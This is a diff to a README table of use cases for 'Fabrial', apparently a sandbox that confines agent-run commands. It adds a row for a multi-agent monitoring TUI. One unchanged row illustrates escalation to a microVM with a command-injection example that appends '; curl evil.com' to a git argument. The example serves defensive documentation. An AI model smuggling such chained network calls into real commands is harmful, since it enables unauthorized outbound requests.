@@ -86,6 +86,7 @@ Every major use case for Fabrial is backed by dedicated, task-oriented recipes i
 | **Dynamic Tier Escalation & Fuzzing Confinement** | Automatically escalate ambiguous parameters, subshells, and differential fuzzing payloads to Tier 2 microVMs:<br/>`fabrial run -- git log -n 1 "; curl evil.com"` | [Guide](docs/use-cases/06-dynamic-tier-escalation.md) |
 | **Optional Pillar Discovery & Fail-Closed Enforcement** | 3-State smart discovery for optional local pillars (`halfshard`, `stormcage`): invisible when absent, auto-wired when installed, fail-closed (`exit 126`) when `require_halfshard` / `require_stormcage` is set:<br/>`fabrial doctor` / `fabrial session launch` | [Guide](docs/use-cases/07-optional-pillar-discovery.md) |
 | **Air-Gap Hermeticity Audit** | Empirically verify zero outbound DNS/TCP egress across installed local binaries under kernel-enforced `airlock run --airgap` confinement:<br/>`fabrial doctor --airgap --json` | [Guide](docs/use-cases/08-airgap-hermeticity-audit.md) |
+| **Local Multi-Agent Mission Control TUI (`fabrial-top`)** | Monitor $N=8$ parallel git worktrees, Fabrial sessions, Locksmith lease TTLs (zero Touch ID), Coppermind pending lens inbox, Tinmind traces & Oathgate checkpoints with `0.00ms` hot-path hop tax:<br/>`fabrial-top` / `fabrial top --snapshot --json` | [Guide](docs/use-cases/09-local-mission-control-tui.md) |
 
 ---
 
